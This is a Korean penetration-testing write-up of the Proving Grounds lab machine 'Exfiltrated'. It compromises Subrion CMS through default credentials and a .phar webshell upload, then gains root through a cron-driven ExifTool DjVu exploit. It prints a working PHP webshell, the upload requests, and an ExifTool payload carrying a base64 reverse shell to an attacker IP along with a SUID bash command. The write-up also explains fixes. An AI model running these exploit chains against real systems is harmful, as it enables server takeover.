---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/web/file-upload
  - tech/lin/cron
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.163
domain: exfiltrated.offsec
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2018-19422, CVE-2021-22204]
status: solved
manual_tags: true
tech_count: 4
---

> [!info] 요약
> **Exfiltrated** · PG Practice Pentester Foundations #9 · Fundamental · Ubuntu 20.04(`exfiltrated`, 192.168.248.163) · 플래그 2개
> 진입점: `robots.txt` 가 알려준 `/panel` 에 `admin:admin` 로그인 → CVE-2018-19422 로 `.phar` 웹셸 업로드 → `www-data`
> 권한상승: root 크론이 업로드 디렉터리를 매분 ExifTool 11.88 로 훑음 → CVE-2021-22204 DjVu 페이로드 → root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.163

### Initial Access – 관리 패널 기본 자격증명과 확장자 블랙리스트 우회로 얻은 Subrion CMS RCE

**Vulnerability Explanation:**
- Subrion CMS 4.2.1 관리 패널(`/panel`)이 기본 자격증명 `admin:admin` 그대로 노출됨
- 관리자 세션 확보 후 파일 매니저(elFinder 커넥터)의 업로드 검증이 확장자 **블랙리스트** 방식 — `.php` 는 막지만 `.phar` 는 목록에 없음
- Ubuntu 20.04 Apache 의 `<FilesMatch ".+\.ph(ar|p|tml)$">` 설정이 `.phar` 도 PHP 로 실행 — 앱이 모르는 웹서버 설정이 실제 위험 집합을 결정함(CVE-2018-19422). MIME 을 `text/x-php` 로 판정하고도 차단에 쓰지 않는 결함이 겹침

**Vulnerability Fix:**
- 설치 시 기본 자격증명 강제 변경, 관리 패널 IP 제한·MFA
- 확장자 화이트리스트로 전환, 업로드 파일은 원 확장자를 버리고 무작위 이름 + 안전한 확장자로 저장
- MIME 판정 결과를 실제 차단 경로에 연결

**Severity:** Critical — 사실상 무인증(기본 자격증명 그대로), 인증 후 즉시 임의 코드 실행

**Steps to reproduce the attack:**
1. `robots.txt` 로 `/panel` 확인 → `admin:admin` 로그인
2. 파일 매니저 업로드 커넥터(`POST /panel/uploads/read.json`, `cmd=upload`)에 `<?php system($_GET["cmd"]); ?>` 를 `exfsh01.phar` 로 업로드
3. 응답이 알려준 저장 URL(`/uploads/exfsh01.phar`)로 GET 요청 → `www-data` 코드 실행 확인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.163 | TCP: 22, 80 |

```text
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
```
— 출처: `~/PG/Exfiltrated/nmap.log`(`nmap -sCV -p- -Pn -A --min-rate 5000` 전 포트 스캔, 28.57초, 2개만 열림)

버전 판정 독립 근거 2개 — ① nmap 배너 `Apache httpd 2.4.41 (Ubuntu)` ② `/panel` 대시보드 좌하단 `Subrion CMS v 4.2.1` 텍스트 + "Recent activity" 로그 `Subrion version 4.2.1 installed. Cheers!`, 두 곳이 교차 확인됨. 인증 전이면 `/changelog.txt` 최상단 항목이 세 번째 근거가 됨.

80 루트가 `http://exfiltrated.offsec/` 로 리다이렉트함(nmap 이 따라가지 않고 `http-title: Did not follow redirect to ...` 로 남김). Apache 의 `<VirtualHost>` 가 `Host:` 헤더로 사이트를 고르므로 IP 로 요청하면 다른 컨텍스트가 돌아 라우팅·세션·CSRF 가 전부 어긋남 — 가상호스트 이름을 `/etc/hosts` 에 먼저 등록.

```bash
echo '192.168.248.163 exfiltrated.offsec' | sudo tee -a /etc/hosts
```

`robots.txt` 가 관리 경로를 그대로 알려줌:

```text
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

`/panel` 이름 자체가 제품 식별 단서(Subrion 관리 URL 관례).

디렉터리 열거에서 함정 셋 확인함. ① Subrion 라우터가 존재하지 않는 경로도 전부 301 로 넘겨 gobuster 와일드카드 감지가 즉시 발동:

```text
the server returns a status code that matches the provided options for non existing urls => 301
```

첫 실행분 `~/PG/Exfiltrated/gobuster.txt` 가 **0바이트로 남아 있는 것이 그 중단의 기록**임 — 빈 파일이 아니라 「히트를 한 건도 쓰지 못하고 죽었다」는 증적. `-f`(트레일링 슬래시) 또는 파일 모드 `-b 404,301` 로 우회해 재실행한 것이 `gobuster_dirs.txt`·`gobuster_files.txt`. ② 확장자가 라우트 매칭에 무의미:

```text
/panel.php   200  6155
/panel.txt   200  6155
/panel.bak   200  6155
/panel.zip   200  6155
/panel.phar  200  6155
```
— 출처: `~/PG/Exfiltrated/gobuster_files.txt`

전부 동일 바이트 수 — 백업 파일이 아니라 라우트, `.bak`/`.zip` 유출로 오독하면 시간을 버림. ③ HTTP 200 인데 본문이 앱 계층 404:

```bash
curl -s http://exfiltrated.offsec/package.json
```
```text
{"error":true,"message":"Requested URL not found.","code":404,"result":true}
```

같은 패턴이 `gobuster_files.txt` 의 `/actions.php`·`/actions.txt` 등 `Status: 200 Size: 0` 다수 항목에도 반복됨. 상태 코드는 전송 계층, 성공·실패는 앱 계층의 의미 — [[Crane]]·[[RubyDome]]·[[Astronaut]]·[[Exghost]]·[[Hawat]] 에서 반복되는 패턴.

`.htaccess` 프로브로 디스크 실존 여부를 응답 크기로 판별함 — `.htaccess`·`.ht*` 는 Apache 기본 설정(`Require all denied`)에서 mod_rewrite 보다 먼저 차단되므로, Apache 자체 403(283바이트)이면 디렉터리가 실재, 앱이 렌더한 404(약 17.5KB)이면 부재:

| 프로브 경로 | 상태 | 크기 | 판정 |
|---|---|---|---|
| `/uploads/.htaccess` | 403 | 283 | 디스크에 실존 |
| `/tmp/.htaccess` | 403 | 283 | 실존 |
| `/includes/.htaccess` | 403 | 283 | 실존 |
| `/backup/.htaccess` | 403 | 283 | 실존 |
| `/uploads/shared/.htaccess` | 404 | 17510 | 부재 |

이 방법으로 `/uploads/` 가 실존하는 업로드 저장 경로임을 업로드 전에 확정함. 프로브 raw 로그는 산출물에 남지 않음(값은 노트 원 기록) — 다만 `gobuster_files.txt` 의 루트 `/.htaccess (Status: 403) [Size: 283]` 가 283바이트 기준선을 독립 확인해 줌.

비인증 표면:

| 분류 | 경로 |
|---|---|
| 사용자 열거 | `/members/` (25KB, 회원 목록 노출) |
| 인증 표면 | `/panel/`, `/login/`, `/registration/`, `/forgot/` |
| 정보 유출 | `/changelog.txt`(49KB), `/license.txt`, `/README.md`, `/sitemap.xml` |
| 기능 | `/cron/` — 비인증 200(43바이트) 응답. 웹에서 크론을 실제로 트리거하는지는 미검증 `[가정]` · `/hybrid/`(473바이트, HybridAuth 소셜로그인 번들) |
| 403 차단 | `/install/`, `/updates/`, `/icons/`, `/server-status`, `.htaccess` 계열 |

![[PG-Exfiltrated-panel_login.png]]

`admin`/`admin` 으로 로그인됨. 사이드바 좌하단 `Subrion CMS v 4.2.1`, "Recent activity" 에 `1896 days ago — Subrion version 4.2.1 installed. Cheers!` 와 `Administrator logged in from 192.168.45.207. — you.`(Kali tun0)가 함께 찍힘:

![[PG-Exfiltrated-panel_dashboard.png]]

4.2.1 은 Subrion 마지막 릴리스 — 업데이트 대기가 아니라 영구 미패치이고, 이것이 CVE-2018-19422 가 계속 살아 있는 이유임.

### Initial Access – 기본 자격증명 → 확장자 블랙리스트 우회 `.phar` 웹셸

CVE-2018-19422 는 관리자 권한이 필요한 인증 후 취약점이나, 기본 자격증명이 살아 있어 인증이 장애물이 되지 않음. 업로드 검증은 확장자 블랙리스트 방식이고 `.php` 와 일부 변형만 거부함. Apache 는 `<FilesMatch ".+\.ph(ar|p|tml)$">` 설정으로 `.phar` 도 PHP 로 실행 — 앱이 통제할 수 없는 서버 설정이 실제 위험 집합을 정함. 이 정규식에서 `.php3`~`.php7`·`.pht` 는 매칭되지 않고, 그건 구형 `AddType` 나열식 설정이 남은 서버에서만 통함. 셸 없이도 `<?php echo 7*6; ?>` 를 각 확장자로 올려 응답이 `42` 면 실행, 원문 그대로면 정적 서빙으로 판별 가능.

업로드 화면은 elFinder 파일 매니저(`Content → Uploads`)임. 다만 이 UI 자체는 브라우저에서 자바스크립트로 커넥터를 호출하는 구조라 헤드리스 캡처에서는 `Unable to connect to backend. HTTP error 0` 으로 떨어짐 — **UI 를 몰 이유가 없고 커넥터 엔드포인트를 직접 때리면 됨**:

![[PG-Exfiltrated-panel_uploads.png]]

```text
POST /panel/uploads/read.json
  reqid=17978446266285, cmd=upload, target=l1_Lw, __st=<CSRF 토큰>
  upload[]  filename="exfsh01.phar"  →  <?php system($_GET["cmd"]); ?>
  mtime[]=1621210391
```
— 요청 조립은 `~/PG/Exfiltrated/sub_upload.py`

응답이 저장 URL 을 그대로 알려줌:

```json
{"added":[{"mime":"text\/x-php","size":"30","name":"exfsh01.phar",
 "url":"http:\/\/exfiltrated.offsec\/uploads\/exfsh01.phar"}]}
```

`mime` 이 `text/x-php` 로 판정됐는데도 통과 — 서버가 내용을 실제로 들여다봤지만(확장자로는 나올 수 없는 판정) 차단에 안 씀. 웹셸을 30바이트로 유지한 이유는 `"size":"30"` 이 그대로 전송 무결성 확인이 되기 때문.

![[PG-Exfiltrated-webshell.png]]

```bash
curl -s 'http://exfiltrated.offsec/uploads/exfsh01.phar?cmd=id;uname -a'
```
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux exfiltrated 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64
```

웹셸이 요청마다 새 프로세스라 상태가 없어 `id;uname -a` 로 한 번에 최대한 확인. 5.4.0-74 는 2021년 커널 — dirtypipe(5.8+) 는 대상 밖, 커널 경로를 후순위로 미루는 판단 근거가 됨.

웹셸 스크린샷(`PG-Exfiltrated-webshell.png`)은 `?cmd=id` **단독 요청**을 헤드리스로 캡처한 것이라 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 한 줄만 담고 있음(`~/PG/Exfiltrated/screenshots/pg_exf_webshell.png`, 6.8KB). 즉 `uname -a` 줄의 부재는 반증이 아니라 **다른 요청**이라는 뜻임. 다만 `id;uname -a` 요청 자체의 raw 로그 파일은 산출물에 없음 — 커널 문자열은 노트 원 기록이 유일한 출처(`[가정]`).

공개 익스플로잇 EDB 49876 은 그대로 쓰면 비대화식 환경에서 실패함 — 하드코딩된 세션 쿠키가 `requests.Session()` 의 실제 세션을 덮어쓰고, 마지막이 `input()` 대화 루프. 소스를 읽고 업로드 요청만 떼어내 `sub_upload.py` 로 직접 구현. 상세 인과는 [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] 참조.

**수동 대안** — 자동 익스플로잇 도구 없이 curl 3요청으로 동일 결과. Metasploit 에 전용 모듈 `exploit/multi/http/subrion_cms_file_upload_rce` 가 존재하나(Kali 설치본에서 확인), 시험 1대 한정 카드를 이 난이도에 쓰지 않음.

```text
① POST /panel/                    → 로그인, 세션 쿠키 획득
② GET  /panel/uploads/            → HTML에서 CSRF 토큰(__st)과 target ID 추출
③ POST /panel/uploads/read.json   → cmd=upload, multipart로 .phar 전송
```

**Local.txt value:**
`46fac3d0bd247ed4b44a22187386b65f`
실제로는 `www-data` 단계에서 읽지 않음 — `local.txt` 소유자 `coaran` 계정 단계를 거치지 않고, `Privilege Escalation` 절에서 root 획득 직후 `proof.txt` 와 한 명령으로 함께 읽음. 원문 캡처는 `Post-Exploitation` 절 참조.

### Privilege Escalation – root 크론의 ExifTool DjVu 메타데이터 파싱(CVE-2021-22204)

**Vulnerability Explanation:**
- root 크론(`/etc/crontab`, 매분)이 `www-data` 쓰기 가능한 업로드 디렉터리를 감시, 파일명에 `jpg` 문자열이 포함된 파일마다 `exiftool` 로 메타데이터 추출 — 저권한이 쓸 수 있는 데이터를 고권한이 검증 없이 처리하는 신뢰 경계 결함
- ExifTool 11.88(7.44~12.23 해당)이 DjVu 주석(`ANTz`) 청크 파싱 시 Perl `eval` 경로로 들어가 코드 실행 — 파일을 읽기만 해도 트리거(CVE-2021-22204)

**Vulnerability Fix:**
- root 크론이 저권한 쓰기 가능 디렉터리를 처리하지 않도록 전용 저권한 계정으로 실행
- ExifTool 12.24 이상으로 업그레이드, 처리 전 매직바이트·크기 검증, 컨테이너/샌드박스(bubblewrap·firejail)에서 파싱

**Severity:** Critical — 저권한(`www-data`)에서 root 로 직행

**Steps to reproduce the attack:**
1. 크론 스크립트(`/opt/image-exif.sh`) 확인 — 감시 경로 `/var/www/html/subrion/uploads`, 파일명 필터 `grep "jpg"`(부분 문자열 일치), `exiftool` 11.88
2. `bzz`/`djvumake`/`exiftool -config` 로 DjVu 페이로드를 JPEG 의 EXIF 사용자 정의 태그에 삽입
3. 웹셸로 base64 를 흘려 넣어 원본 바이트 그대로 `uploads/evil.jpg` 저장(파일 매니저 경유 시 재인코딩으로 페이로드 소실 위험) → MD5 대조로 무결성 확인
4. `chmod +s /bin/bash` + 백그라운드 리버스셸 이중 페이로드로 성공 판정 채널 이중화, 크론 주기(60초) 대기

크론 스크립트 확인:

```text
www-data@exfiltrated:/$ cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata

echo -ne "\\n metadata directory cleaned! \\n\\n"

IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename;
do
    exiftool "$IMAGES/$filename" >> $LOGFILE
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

```text
www-data@exfiltrated:/$ tail -1 /etc/crontab
* *	* * *	root	bash /opt/image-exif.sh

www-data@exfiltrated:/$ exiftool -ver
11.88
```

감시 경로가 웹루트 그 자체(`/var/www/html/uploads`)가 아니라 `subrion/` 하위 서브디렉터리 — 흔한 오답. `grep "jpg"` 는 확장자가 아니라 파일명 어디에든 `jpg` 문자열이 있으면 통과(`jpgpayload.txt` 도 통과, 반대로 `.jpeg` 는 통과 못함). `exiftool "$IMAGES/$filename"` 처럼 따옴표가 걸려 있어 파일명 인젝션은 막힘 — 파일 내용 자체의 취약점(CVE-2021-22204)이 유일한 길이 됨.

조건이 틀리면 에러 없이 조용히 무시됨 — 크론은 정상 종료, 로그만 `/opt/metadata/` 에 쌓임. 크론 기반 권한상승 일반론은 [[_PLAYBOOK#B-31. 크론 기반 권한상승]] 참조.

DjVu 페이로드 제작:

```text
bzz payload payload.bzz
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTz=payload.bzz
convert -size 64x64 xc:red image.jpg
exiftool -config configfile '-HasselbladExif<=exploit.djvu' image.jpg
md5sum image.jpg
```
```text
5f817e389ada908a21433ad20403a884  image.jpg
```
— 출처: `~/PG/Exfiltrated/exif/`(`configfile`·`payload`·`payload.bzz`·`exploit.djvu`·`image.jpg`)

`configfile` 이 ExifTool 에 사용자 정의 태그(`0xc51b`, HasselbladExif)를 등록해 DjVu 파일 전체를 EXIF 필드 값으로 넣을 통로를 만듦:

```text
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
    },
);
1; #end
```
— 출처: `~/PG/Exfiltrated/exif/configfile`(md5 `924e0f9baf5e4b5e65c36820cbacb710`)

`0xc51b` 은 실재하는 Hasselblad 전용 태그 번호라 다른 파서와 충돌이 적음. `1; #end` 는 Perl 모듈 파일이 참을 반환해야 로드가 성공하기 때문에 필요 — 이 줄이 빠지면 `-config` 로드 자체가 실패함.

DjVu 주석에 심는 페이로드:

```text
(metadata "\c${system('echo Y2htb2QgK3MgL2Jpbi9iYXNoOyAoYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy81NTU1IDA+JjEnICYp | base64 -d | bash')};")
```
— 출처: `~/PG/Exfiltrated/exif/payload`

`\c` 이스케이프 뒤의 `${ }` 가 Perl 문자열 보간으로 해석돼 블록 안이 코드로 평가됨. 디코드하면:

```bash
chmod +s /bin/bash; (bash -c 'bash -i >& /dev/tcp/192.168.45.207/5555 0>&1' &)
```

원 명령에 `'`·`"`·`>`·`&`·`$` 가 섞여 있어 Perl 문자열 → DjVu 주석 → bzz 압축 → EXIF 값 → 셸의 5개 층을 통과해야 함. base64 는 영숫자와 `+/=` 뿐이라 어느 층에서도 안 깨짐 — 인용 escape 를 손으로 맞추려 하지 않음. 상세는 [[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]], [[Hawat]] hex·[[Squid]] `INTO DUMPFILE` 도 같은 계열.

리버스셸을 `( ... & )` 로 감싼 이유 — 크론이 실행한 exiftool 프로세스가 리버스셸에 물려 반환하지 않으면 그 크론 인스턴스가 끝나지 않아 크론이 매분 새 인스턴스를 띄우며 프로세스가 쌓임. 서브셸 백그라운드는 부모(exiftool→크론)를 정상 종료시키고 셸만 고아 프로세스로 남김.

웹셸로 base64 를 흘려 넣어 배치:

```bash
B64=$(base64 -w0 exif/image.jpg)
curl -G --data-urlencode "cmd=echo $B64 | base64 -d > /var/www/html/subrion/uploads/evil.jpg; md5sum /var/www/html/subrion/uploads/evil.jpg" \
     http://exfiltrated.offsec/uploads/exfsh01.phar
```
```text
5f817e389ada908a21433ad20403a884  /var/www/html/subrion/uploads/evil.jpg
```

MD5 가 원본과 일치 — 전송 손상 없음. 파일명이 `evil.jpg` 라 `grep "jpg"` 필터도 통과. `-G`(POST 대신 쿼리스트링, 웹셸은 `$_GET` 읽음)와 `--data-urlencode`(base64 의 `+` 가 URL 공백으로 해석되는 것 방지) 둘 다 필수. MD5 확인 습관은 [[_PLAYBOOK#B-82. 파일 전송 후 `ls`/`md5sum`으로 확인한다]] 참조, [[Squid]]·[[Exghost]] 도 같은 습관.

8초 간격 폴링(60초 주기 대비 평균 4초 내 감지 — 1초는 로그·프로세스만 늘리고 30초는 감지가 늦음). 관측된 모드 변화:

| 시도 | 경과 | `/bin/bash` 모드 | 판정 |
|---|---|---|---|
| try 6 | 약 48초 | `-rwxr-xr-x 1 root root 1183448` | 아직 |
| try 7 | 다음 폴링(+8초) | `-rwsr-sr-x 1 root root 1183448` | SUID 반영됨 |

동시에 5555 리스너에 root 셸 접속:

```text
listening on [any] 5555 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.163] 53782
root@exfiltrated:~# id; hostname
uid=0(root) gid=0(root) groups=0(root)
exfiltrated
```

SUID 경로도 살아 있음 — `/bin/bash -p` 로 `euid=0` 확인 가능(bash 는 euid≠uid 를 감지하면 특권을 스스로 버리므로 `-p` 없이는 무용지물, `whoami` 는 여전히 `www-data` 로 보여 `id` 로 euid 를 봐야 함).

### Post-Exploitation

**Proof.txt value:**
`36609d5b634dd0b79041f3ad480fbdd2`

```text
root@exfiltrated:~# cat /root/proof.txt; cat /home/coaran/local.txt
36609d5b634dd0b79041f3ad480fbdd2
46fac3d0bd247ed4b44a22187386b65f
```

`local.txt` 소유자 `coaran` 계정을 거치지 않고 root 권한으로 직접 읽음.

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `/home/coaran/local.txt` | `46fac3d0bd247ed4b44a22187386b65f` |
| `proof.txt` | `/root/proof.txt` | `36609d5b634dd0b79041f3ad480fbdd2` |

⚠️ **출처 유보** — 이 노트의 타겟 pty 블록(`www-data@exfiltrated`·`root@exfiltrated` 프롬프트가 붙은 것 전부: 크론 스크립트·`/etc/crontab`·`exiftool -ver`·root 셸 접속·플래그·정리)은 **셸 안에서 친 명령이라 `~/.zsh_history` 에도 남지 않고**, 대응하는 캡처 파일(`proof_user.txt`/`proof_root.txt` 등)도 `~/PG/Exfiltrated/` 에 없음. 값의 출처는 노트 원 기록뿐이며 `ip a`/`hostname -I`/`date` 를 포함한 완전한 한 화면 증거는 **관측 없음**. 반면 Kali 쪽 산출물(nmap·gobuster·`exif/` 페이로드 일체)은 파일로 남아 있고, `exif/image.jpg` 의 md5 `5f817e389ada908a21433ad20403a884` 가 본문에 적힌 타겟 측 md5 와 일치하는 것이 배치 단계까지의 독립 확인임.

**남긴 흔적** — 정리 완료.

```text
root@exfiltrated:~# rm -f /var/www/html/subrion/uploads/evil.jpg /var/www/html/subrion/uploads/exfsh01.phar
root@exfiltrated:~# chmod 755 /bin/bash
root@exfiltrated:~# ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

`evil.jpg` 를 지우지 않으면 매분 root RCE 가 계속 트리거됨 — 정리는 선택이 아님. 웹셸(`exfsh01.phar`)·페이로드(`evil.jpg`) 삭제, SUID bash 원복(`755`) 확인. 남은 것은 `/opt/metadata/` 크론 로그 부산물과 Subrion 관리자 로그인 기록뿐 — 설정 변경·데이터 삭제 없음.

## 관련

- CVE-2018-19422 — Subrion CMS ≤ 4.2.1, 인증 후 임의 파일 업로드 → RCE. <https://nvd.nist.gov/vuln/detail/CVE-2018-19422> · Exploit-DB 49876(Python, 하드코딩 쿠키·`input()` 루프 주의)
- CVE-2021-22204 — ExifTool 7.44~12.23, DjVu 주석 파싱 시 Perl `eval` 코드 실행(12.24 수정). <https://nvd.nist.gov/vuln/detail/CVE-2021-22204> · 필요 도구 `djvulibre-bin`(`bzz`, `djvumake`)
- Apache PHP 핸들러 매핑 — Debian/Ubuntu 기본값 `<FilesMatch ".+\.ph(ar|p|tml)$">` (`/etc/apache2/mods-enabled/php*.conf`). Kali 의 `php8.4.conf` 도 비캡처군 형태 `".+\.ph(?:ar|p|tml)$"` 로 동일 집합을 매핑함(직접 확인)
- PayloadsAllTheThings — Upload Insecure Files(확장자 우회 후보 목록)
- GTFOBins — `bash`: SUID 항목(`bash -p`)
- [[Exghost]] — 같은 CVE-2021-22204, 다른 트리거(웹 업로드 즉시 실행 vs 여기 root 크론 지연 실행)
- [[Astronaut]] · [[Muddy]] — 크론 기반 권한상승
- [[Hawat]] · [[Squid]] — 인용 중첩 회피(hex/base64), 바이너리 전송 후 해시 대조
- [[Levram]] — 공개 익스플로잇을 읽고 고쳐 쓰기
- [[Crane]] · [[RubyDome]] — "응답이 성공을 뜻하지 않는다"
- [[01. Pentest Foundations]] — 이 박스가 속한 컬렉션(#9)
- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[_PLAYBOOK]] — 시행착오·기법 카드의 유일한 소재지
- [[_PLAYBOOK#A-1-23. 확장자 사전을 늘려도 새 경로가 안 나온다 — 라우팅형 앱은 파일이 아님]] · [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] · [[_PLAYBOOK#B-31. 크론 기반 권한상승]] · [[_PLAYBOOK#B-1-36. 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기]] · [[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]] · [[_PLAYBOOK#B-82. 파일 전송 후 `ls`/`md5sum`으로 확인한다]]
